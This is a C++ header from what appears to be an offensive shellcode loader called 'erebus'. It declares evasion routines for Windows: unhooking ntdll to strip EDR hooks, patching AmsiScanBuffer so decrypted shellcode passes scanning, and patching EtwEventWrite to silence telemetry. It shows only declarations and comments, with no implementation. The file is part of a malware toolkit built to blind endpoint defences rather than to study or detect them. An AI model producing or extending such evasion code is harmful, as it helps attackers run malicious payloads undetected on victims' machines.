#ifndef EREBUS_EVASION_HPP
#define EREBUS_EVASION_HPP
#pragma once

#include <windows.h>

namespace erebus {
namespace evasion {

    // Overlay the loaded ntdll .text section with a clean copy mapped
    // from \KnownDlls\ntdll.dll, removing any EDR inline hooks on Nt*
    // stubs. Returns TRUE if at least one .text section was overlaid.
    BOOL UnhookNtdll();

    // Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN, preventing
    // in-process content scanning of the decrypted shellcode buffer.
    BOOL PatchAmsi();

    // Patch EtwEventWrite to return immediately (ret 0), suppressing
    // ETW telemetry from the loader process.  Prevents .NET / managed
    // runtime tracing when hosting ClickOnce or when shellcode loads
    // a CLR.
    BOOL PatchEtw();

    // Run all evasion patches.  Returns TRUE if at least one patch
    // succeeded (partial success is acceptable - AMSI may not be
    // loaded in non-.NET processes).
    BOOL RunEvasionPatches();

} // namespace evasion
} // namespace erebus

#endif
